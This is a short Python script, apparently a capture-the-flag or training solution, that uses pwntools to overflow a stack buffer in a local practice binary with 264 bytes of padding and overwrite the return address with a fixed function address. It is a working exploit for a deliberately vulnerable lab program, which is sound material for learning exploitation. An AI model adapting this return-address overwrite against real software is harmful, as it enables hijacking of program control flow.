from pwn import *

p = process("return_address_overwrite_64bit")

p.recvuntil(": ")

payload = "A" * 264
payload += p64(0x00000000004011fd)

pause()

p.sendline(payload)

p.interactive()